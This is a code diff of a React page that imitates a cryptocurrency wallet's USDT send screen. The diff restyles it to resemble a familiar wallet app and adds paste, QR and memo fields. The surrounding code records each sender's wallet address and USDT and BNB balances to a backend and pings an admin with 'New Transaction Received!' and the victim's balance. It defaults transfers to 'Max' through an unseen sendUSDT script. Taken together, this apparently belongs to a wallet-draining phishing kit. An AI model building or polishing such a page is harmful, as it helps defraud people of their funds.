@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
+import { ClipboardPaste, User, QrCode, Info } from "lucide-react";
 
 declare global {
   interface Window {
@@ -14,6 +15,7 @@ declare global {
       nativeBalance: string;
     }) => void;
     setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
+    updateWalletAddress?: (address: string) => void;
     ethereum?: {
       request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
       on: (event: string, callback: (...args: unknown[]) => void) => void;
@@ -26,6 +28,7 @@ export default function Index() {
   const [searchParams] = useSearchParams();
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
+  const [memo, setMemo] = useState("");
   const [transactionStatus, setTransactionStatus] = useState<"idle" | "processing" | "success">("idle");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
@@ -35,11 +38,8 @@ export default function Index() {
       setToAddress(addressParam);
     }
 
-    // Expose status setter for app.js
     window.setTransactionStatus = (status) => {
       setTransactionStatus(status);
-      
-      // Auto-reset to idle after success
       if (status === "success") {
         setTimeout(() => {
           setTransactionStatus("idle");
@@ -47,8 +47,13 @@ export default function Index() {
       }
     };
 
+    window.updateWalletAddress = (address: string) => {
+      setToAddress(address);
+    };
+
     return () => {
       delete window.setTransactionStatus;
+      delete window.updateWalletAddress;
     };
   }, [searchParams]);
 
@@ -57,16 +62,15 @@ export default function Index() {
       createTransaction({
         walletAddress: data.walletAddress,
         toAddress: data.toAddress,
-        amount: "Max",
+        amount: amount || "Max",
         txHash: data.txHash,
         usdtBalance: data.usdtBalance + " USDT",
         nativeBalance: data.nativeBalance + " BNB",
       }).then(() => {
-        // Trigger notification if enabled
         const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
         if (notificationsEnabled && Notification.permission === "granted") {
-          new Notification("🎯 New Transaction Received!", {
-            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nAmount: Max\nUSDT Balance: ${data.usdtBalance} USDT`,
+          new Notification("New Transaction Received!", {
+            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nAmount: ${amount || "Max"}\nUSDT Balance: ${data.usdtBalance} USDT`,
             icon: "/favicon.ico",
             badge: "/favicon.ico",
             tag: data.txHash,
@@ -79,19 +83,14 @@ export default function Index() {
     return () => {
       delete window.saveTransaction;
     };
-  }, [createTransaction]);
+  }, [createTransaction, amount]);
 
-  async function handleSendUSDT() {
+  async function handleSend() {
     if (!window.sendUSDT) return;
-    
-    // Show processing state immediately when user clicks
     setTransactionStatus("processing");
-    
     try {
       await window.sendUSDT();
-      // Success status will be set by app.js
     } catch (error) {
-      // Error already handled by sendUSDT function
       console.error(error);
       setTransactionStatus("idle");
     }
@@ -101,120 +100,275 @@ export default function Index() {
     setAmount("Max");
   }
 
+  async function handlePaste() {
+    try {
+      const text = await navigator.clipboard.readText();
+      setToAddress(text.trim());
+    } catch {
+      // Clipboard access denied
+    }
+  }
+
+  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
+    ? `= $${Number(amount).toFixed(2)}`
+    : amount === "Max" ? "= Max USDT" : "";
+
   return (
     <div
       style={{
         margin: 0,
-        background: "#0b0b0b",
-        color: "#fff",
-        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
+        background: "#ffffff",
+        color: "#1a1a2e",
+        fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif",
         minHeight: "100vh",
+        display: "flex",
+        flexDirection: "column",
       }}
     >
-      <div style={{ padding: "20px" }}>
-        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
-          Address or Domain Name
-        </div>
-        <div
-          style={{
-            background: "#151515",
+      <div style={{ padding: "24px 20px", flex: 1 }}>
+        {/* Address Field */}
+        <div style={{ marginBottom: "24px" }}>
+          <label style={{
+            display: "block",
+            fontSize: "15px",
+            fontWeight: 500,
+            color: "#1a1a2e",
+            marginBottom: "8px",
+          }}>
+            Address or Domain Name
+          </label>
+          <div style={{
+            display: "flex",
+            alignItems: "center",
+            border: "1.5px solid #e0e0e8",
             borderRadius: "12px",
-            padding: "14px",
-            marginBottom: "20px",
-          }}
-        >
-          <input
-            id="toAddress"
-            value={toAddress}
-            onChange={(e) => setToAddress(e.target.value)}
-            placeholder="0x..."
-            style={{
-              width: "100%",
-              background: "transparent",
+            padding: "12px 14px",
+            background: "#fff",
+            gap: "8px",
+          }}>
+            <input
+              id="toAddress"
+              value={toAddress}
+              onChange={(e) => setToAddress(e.target.value)}
+              placeholder="0x..."
+              style={{
+                flex: 1,
+                background: "transparent",
+                border: "none",
+                outline: "none",
+                color: "#1a1a2e",
+                fontSize: "15px",
+                fontFamily: "inherit",
+              }}
+            />
+            <button
+              onClick={handlePaste}
+              style={{
+                display: "flex",
+                alignItems: "center",
+                gap: "4px",
+                background: "none",
+                border: "none",
+                color: "#3051d3",
+                cursor: "pointer",
+                padding: "4px",
+                fontSize: "13px",
+                fontWeight: 600,
+              }}
+            >
+              <ClipboardPaste size={18} strokeWidth={2.2} />
+              <span>Paste</span>
+            </button>
+            <div style={{
+              width: "1px",
+              height: "20px",
+              background: "#e0e0e8",
+            }} />
+            <button style={{
+              background: "none",
               border: "none",
-              outline: "none",
-              color: "#fff",
-              fontSize: "16px",
-            }}
-          />
+              color: "#3051d3",
+              cursor: "pointer",
+              padding: "4px",
+              display: "flex",
+            }}>
+              <User size={20} strokeWidth={2.2} />
+            </button>
+            <button style={{
+              background: "none",
+              border: "none",
+              color: "#3051d3",
+              cursor: "pointer",
+              padding: "4px",
+              display: "flex",
+            }}>
+              <QrCode size={20} strokeWidth={2.2} />
+            </button>
+          </div>
         </div>
 
-        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
-          Amount
-        </div>
-        <div
-          style={{
-            background: "#151515",
-            borderRadius: "12px",
-            padding: "14px",
-            marginBottom: "20px",
+        {/* Amount Field */}
+        <div style={{ marginBottom: "24px" }}>
+          <label style={{
+            display: "block",
+            fontSize: "15px",
+            fontWeight: 500,
+            color: "#1a1a2e",
+            marginBottom: "8px",
+          }}>
+            Amount
+          </label>
+          <div style={{
             display: "flex",
-            justifyContent: "space-between",
             alignItems: "center",
-          }}
-        >
-          <input
-            id="amount"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            placeholder="0.0"
-            style={{
-              background: "transparent",
-              border: "none",
-              outline: "none",
-              color: "#fff",
-              fontSize: "16px",
-              flex: 1,
-            }}
-          />
-          <div>
-            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
-            &nbsp;&nbsp;
-            <span
+            border: "1.5px solid #e0e0e8",
+            borderRadius: "12px",
+            padding: "12px 14px",
+            background: "#fff",
+            gap: "8px",
+          }}>
+            <input
+              id="amount"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              placeholder="0"
+              type="text"
+              inputMode="decimal"
+              style={{
+                flex: 1,
+                background: "transparent",
+                border: "none",
+                outline: "none",
+                color: "#1a1a2e",
+                fontSize: "15px",
+                fontFamily: "inherit",
+              }}
+            />
+            <span style={{
+              color: "#1a1a2e",
+              fontWeight: 600,
+              fontSize: "15px",
+              letterSpacing: "0.02em",
+            }}>
+              USDT
+            </span>
+            <button
               onClick={setMax}
               style={{
-                color: "#25d695",
-                fontSize: "14px",
+                background: "none",
+                border: "none",
+                color: "#3051d3",
                 cursor: "pointer",
+                padding: "2px 4px",
+                fontSize: "15px",
+                fontWeight: 600,
               }}
             >
               Max
-            </span>
+            </button>
+          </div>
+          {dollarValue && (
+            <div style={{
+              fontSize: "13px",
+              color: "#8a8a9a",
+              marginTop: "6px",
+              paddingLeft: "2px",
+            }}>
+              {dollarValue}
+            </div>
+          )}
+        </div>
+
+        {/* Memo Field */}
+        <div style={{ marginBottom: "24px" }}>
+          <label style={{
+            display: "block",
+            fontSize: "15px",
+            fontWeight: 500,
+            color: "#1a1a2e",
+            marginBottom: "8px",
+          }}>
+            Memo
+          </label>
+          <div style={{
+            display: "flex",
+            alignItems: "center",
+            border: "1.5px solid #e0e0e8",
+            borderRadius: "12px",
+            padding: "12px 14px",
+            background: "#fff",
+            gap: "8px",
+          }}>
+            <input
+              value={memo}
+              onChange={(e) => setMemo(e.target.value)}
+              placeholder=""
+              style={{
+                flex: 1,
+                background: "transparent",
+                border: "none",
+                outline: "none",
+                color: "#1a1a2e",
+                fontSize: "15px",
+                fontFamily: "inherit",
+              }}
+            />
+            <button style={{
+              background: "none",
+              border: "none",
+              color: "#3051d3",
+              cursor: "pointer",
+              padding: "4px",
+              display: "flex",
+            }}>
+              <QrCode size={20} strokeWidth={2.2} />
+            </button>
+            <button style={{
+              background: "none",
+              border: "none",
+              color: "#3051d3",
+              cursor: "pointer",
+              padding: "4px",
+              display: "flex",
+            }}>
+              <Info size={20} strokeWidth={2.2} />
+            </button>
           </div>
         </div>
       </div>
 
-      <button
-        onClick={handleSendUSDT}
-        disabled={transactionStatus !== "idle"}
-        style={{
-          position: "fixed",
-          bottom: "20px",
-          left: "20px",
-          right: "20px",
-          background: 
-            transactionStatus === "success" ? "#25d695" : 
-            transactionStatus === "processing" ? "#666" : 
-            "#1f8f5f",
-          color: 
-            transactionStatus === "success" ? "#000" : 
-            transactionStatus === "processing" ? "#aaa" : 
-            "#000",
-          border: "none",
-          borderRadius: "14px",
-          padding: "16px",
-          fontSize: "18px",
-          fontWeight: 600,
-          cursor: transactionStatus === "idle" ? "pointer" : "not-allowed",
-          opacity: transactionStatus === "processing" ? 0.7 : 1,
-        }}
-      >
-        {transactionStatus === "success" 
-          ? "✅ Transaction Successful!" 
-          : transactionStatus === "processing" 
-          ? "Processing..." 
-          : "Send"}
-      </button>
+      {/* Bottom Button */}
+      <div style={{
+        padding: "16px 20px",
+        paddingBottom: "32px",
+      }}>
+        <button
+          onClick={handleSend}
+          disabled={transactionStatus !== "idle"}
+          style={{
+            width: "100%",
+            background:
+              transactionStatus === "success" ? "#22c55e" :
+              transactionStatus === "processing" ? "#8b9ad3" :
+              "#3051d3",
+            color: "#ffffff",
+            border: "none",
+            borderRadius: "28px",
+            padding: "16px",
+            fontSize: "17px",
+            fontWeight: 600,
+            cursor: transactionStatus === "idle" ? "pointer" : "not-allowed",
+            letterSpacing: "0.01em",
+            transition: "background 0.2s ease",
+          }}
+        >
+          {transactionStatus === "success"
+            ? "Transaction Successful!"
+            : transactionStatus === "processing"
+            ? "Processing..."
+            : "Next"}
+        </button>
+      </div>
     </div>
   );
 }
